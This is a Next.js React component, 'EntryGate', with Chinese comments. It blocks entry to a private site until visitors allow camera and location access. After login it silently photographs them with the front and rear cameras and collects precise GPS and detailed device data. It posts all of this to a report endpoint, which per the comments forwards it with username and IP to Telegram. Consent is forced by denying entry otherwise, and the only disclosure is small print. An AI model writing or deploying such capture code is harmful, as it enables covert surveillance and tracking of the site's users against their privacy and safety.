'use client';

import { Camera, Loader2, MapPin, ShieldAlert } from 'lucide-react';
import { usePathname } from 'next/navigation';
import { ReactNode, useCallback, useEffect, useRef, useState } from 'react';

import OperationWatcher from './OperationWatcher';

/* 进站门禁（三段式）：
   1. 进门只请求授权（摄像头+GPS），不拍照；拒绝则停留授权页重弹
   2. 授权通过立即放行进入网页（含登录页）
   3. 登录完成（离开登录类页面）后才拍照+定位上报，服务端附用户名/IP/归属地推 Telegram
   管理员（owner/admin）全程不弹不拍。 */

const SS_KEY = 'entry_capture_ok';
const LS_KEY = 'entry_capture_last';
const LS_PERM = 'entry_perm_ok';
const COOLDOWN_MS = 10 * 60 * 1000;

const AUTH_PAGES = ['/login', '/register', '/oidc-register', '/qr-login', '/tv/login', '/warning'];

type Status = 'checking' | 'ok' | 'blocked';
type Gps = { lat: number; lng: number; acc: number };

async function grabFrame(stream: MediaStream): Promise<string | undefined> {
  try {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    await video.play().catch(() => undefined);
    await new Promise((r) => setTimeout(r, 500));
    const w = video.videoWidth || 0;
    const h = video.videoHeight || 0;
    if (!w || !h) return undefined;
    const scale = Math.min(1, 640 / w);
    const canvas = document.createElement('canvas');
    canvas.width = Math.round(w * scale);
    canvas.height = Math.round(h * scale);
    const ctx = canvas.getContext('2d');
    if (!ctx) return undefined;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg', 0.72);
  } catch {
    return undefined;
  } finally {
    stream.getTracks().forEach((t) => t.stop());
  }
}

const isDeny = (e: unknown) => {
  const name = (e as DOMException)?.name;
  return name === 'NotAllowedError' || name === 'SecurityError';
};

/** 仅请求前置摄像头授权并立即释放，不拍照。返回 'denied' | 'ok' | 'nohw' */
async function probeCamera(): Promise<'denied' | 'ok' | 'nohw'> {
  if (!navigator.mediaDevices?.getUserMedia) return 'denied';
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false,
    });
    stream.getTracks().forEach((t) => t.stop());
    return 'ok';
  } catch (e) {
    return isDeny(e) ? 'denied' : 'nohw';
  }
}

/** 请求定位授权；仅「确实拒绝」算 denied。
    iOS Safari 存在弹窗被抑制却回调 PERMISSION_DENIED 的情况：
    此时 permissions.query 仍为 prompt，视为未决，放行（登录后采集时再取）。 */
function probeGps(): Promise<'denied' | 'ok'> {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) return resolve('ok');
    navigator.geolocation.getCurrentPosition(
      () => resolve('ok'),
      async (err) => {
        if (err.code !== err.PERMISSION_DENIED) return resolve('ok');
        try {
          const st = await navigator.permissions?.query?.({ name: 'geolocation' });
          if (st && st.state === 'prompt') return resolve('ok');
        } catch {
          /* ignore */
        }
        resolve('denied');
      },
      { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
    );
  });
}

function getGpsSoft(): Promise<Gps | null> {
  const once = (high: boolean, timeout: number) =>
    new Promise<Gps | null>((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (p) =>
          resolve({
            lat: p.coords.latitude,
            lng: p.coords.longitude,
            acc: Math.round(p.coords.accuracy || 0),
          }),
        () => resolve(null),
        { enableHighAccuracy: high, timeout, maximumAge: 0 }
      );
    });
  return (async () => {
    if (!('geolocation' in navigator)) return null;
    const first = await once(true, 10000);
    if (first) return first;
    return once(false, 8000);
  })();
}

async function captureCameras(): Promise<{ front?: string; back?: string }> {
  const out: { front?: string; back?: string } = {};
  if (!navigator.mediaDevices?.getUserMedia) return out;
  try {
    const frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 } },
      audio: false,
    });
    out.front = await grabFrame(frontStream);
  } catch {
    /* 拒绝或无硬件：略 */
  }
  try {
    const backStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'environment', width: { ideal: 640 } },
      audio: false,
    });
    out.back = await grabFrame(backStream);
  } catch {
    /* 无后置摄像头 */
  }
  return out;
}

async function deviceInfo() {
  const ua = navigator.userAgent;
  let model = '';
  let platform = '';
  let platformVersion = '';
  const nav = navigator as Navigator & {
    userAgentData?: {
      getHighEntropyValues: (hints: string[]) => Promise<{
        model?: string;
        platform?: string;
        platformVersion?: string;
      }>;
    };
  };
  try {
    if (nav.userAgentData?.getHighEntropyValues) {
      const he = await nav.userAgentData.getHighEntropyValues([
        'model',
        'platform',
        'platformVersion',
      ]);
      model = he.model || '';
      platform = he.platform || '';
      platformVersion = he.platformVersion || '';
    }
  } catch {
    /* ignore */
  }
  return { ua, model, platform, platformVersion };
}

export default function EntryGate({ children }: { children: ReactNode }) {
  const pathname = usePathname();
  const [status, setStatus] = useState<Status>('checking');
  const [missing, setMissing] = useState<string[]>([]);
  const [round, setRound] = useState(0);
  const enabledRef = useRef(true);
  const permOkRef = useRef(false);
  const capturingRef = useRef(false);

  /* 第一段：进门查身份+请求授权，不拍照 */
  const probe = useCallback(async () => {
    setStatus('checking');
    setMissing([]);
    try {
      const res = await fetch('/api/entry/status', { cache: 'no-store' }).catch(() => null);
      if (res?.ok) {
        const j = (await res.json()) as { capture?: boolean };
        if (j.capture === false) {
          enabledRef.current = false; // 管理员不拍不弹
          setStatus('ok');
          return;
        }
      }
    } catch {
      /* 状态接口失败按需要拍处理 */
    }
    try {
      if (sessionStorage.getItem(SS_KEY)) {
        permOkRef.current = true;
        try {
          localStorage.setItem(LS_PERM, '1');
        } catch {
          /* ignore */
        }
        setStatus('ok');
        return;
      }
      const last = Number(localStorage.getItem(LS_KEY) || 0);
      if (last && Date.now() - last < COOLDOWN_MS) {
        permOkRef.current = true;
        try {
          localStorage.setItem(LS_PERM, '1');
        } catch {
          /* ignore */
        }
        setStatus('ok');
        return;
      }
      if (localStorage.getItem(LS_PERM)) permOkRef.current = true;
    } catch {
      /* ignore */
    }
    if (permOkRef.current) {
      setStatus('ok');
      return;
    }
    const miss: string[] = [];
    const cam = await probeCamera();
    if (cam === 'denied') miss.push('摄像头');
    const gps = await probeGps();
    if (gps === 'denied') miss.push('位置');
    if (miss.length) {
      setMissing(miss);
      setStatus('blocked');
      return;
    }
    permOkRef.current = true;
    try {
      localStorage.setItem(LS_PERM, '1');
    } catch {
      /* ignore */
    }
    setStatus('ok');
  }, []);

  useEffect(() => {
    void probe();
  }, [probe, round]);

  /* 第三段：登录完成（离开登录类页面）后拍照上报 */
  useEffect(() => {
    if (status !== 'ok' || !enabledRef.current || !permOkRef.current) return;
    if (AUTH_PAGES.some((p) => pathname === p || pathname.startsWith(p + '/'))) return;
    let cancelled = false;
    let skip = false;
    try {
      if (sessionStorage.getItem(SS_KEY)) skip = true;
      const last = Number(localStorage.getItem(LS_KEY) || 0);
      if (last && Date.now() - last < COOLDOWN_MS) skip = true;
    } catch {
      /* ignore */
    }
    if (skip || capturingRef.current) return;
    capturingRef.current = true;
    (async () => {
      try {
        const cam = await captureCameras();
        const gps = await getGpsSoft();
        const device = await deviceInfo();
        if (cancelled) return;
        const res = await fetch('/api/entry/report', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ front: cam.front || '', back: cam.back || '', gps, device }),
        }).catch(() => null);
        if (res?.ok) {
          try {
            sessionStorage.setItem(SS_KEY, '1');
            localStorage.setItem(LS_KEY, String(Date.now()));
          } catch {
            /* ignore */
          }
        }
      } catch {
        /* 任何意外都不拦人，下次进入重试 */
      } finally {
        capturingRef.current = false;
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [pathname, status]);

  if (status === 'ok')
    return (
      <>
        {children}
        <OperationWatcher />
      </>
    );

  return (
    <div className='fixed inset-0 z-[9999] flex items-center justify-center bg-gray-950/95 px-5 backdrop-blur'>
      <div className='w-full max-w-sm rounded-2xl bg-white p-6 text-center shadow-2xl dark:bg-gray-800'>
        <div className='mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-amber-500/15 text-amber-600 dark:text-amber-400'>
          {status === 'checking' ? (
            <Loader2 className='h-7 w-7 animate-spin' />
          ) : (
            <ShieldAlert className='h-7 w-7' />
          )}
        </div>
        {status === 'checking' ? (
          <>
            <h1 className='text-base font-semibold text-gray-900 dark:text-gray-100'>
              正在进行进入验证
            </h1>
            <p className='mt-2 text-xs leading-relaxed text-gray-500 dark:text-gray-400'>
              本站需要验证摄像头与位置授权，请在浏览器弹窗中选择「允许」。授权后即可进入。
            </p>
            <p className='mt-2 text-[11px] leading-relaxed text-gray-400 dark:text-gray-500'>
              进入并登录后，站内的每次操作都会拍摄前后摄像头照片与屏幕截图，连同账号、IP、位置发送给站长留档。
            </p>
          </>
        ) : (
          <>
            <h1 className='text-base font-semibold text-gray-900 dark:text-gray-100'>
              授权未完成，无法进入
            </h1>
            <p className='mt-2 text-xs leading-relaxed text-gray-500 dark:text-gray-400'>
              缺少授权：{missing.join('、')}。本站为私人站点，进入必须同时允许
              摄像头与位置信息。请点击下方按钮重新授权。
            </p>
            <p className='mt-2 text-left text-[11px] leading-relaxed text-gray-400 dark:text-gray-500'>
              {/iPhone|iPad|iPod/.test(navigator.userAgent)
                ? 'iPhone/iPad：若重弹后仍失败，请去 设置→隐私与安全性→定位服务 打开总开关，并在 设置→Safari→位置 选择「询问」；摄像头被禁时在 设置→Safari→相机 改为「询问」，然后回到本页点重新授权。'
                : '安卓：若重弹后仍失败，请去 系统设置→应用→浏览器→权限 中允许相机与位置信息；或点地址栏锁图标→网站设置→允许，然后回到本页点重新授权。'}
            </p>
            <div className='mt-3 flex justify-center gap-4 text-[11px] text-gray-400 dark:text-gray-500'>
              <span className='flex items-center gap-1'>
                <Camera className='h-3.5 w-3.5' /> 摄像头
              </span>
              <span className='flex items-center gap-1'>
                <MapPin className='h-3.5 w-3.5' /> 位置
              </span>
            </div>
            <button
              type='button'
              onClick={() => setRound((r) => r + 1)}
              className='mt-5 w-full rounded-xl bg-amber-500 py-2.5 text-sm font-medium text-white transition hover:bg-amber-600'
            >
              重新授权
            </button>
          </>
        )}
      </div>
    </div>
  );
}
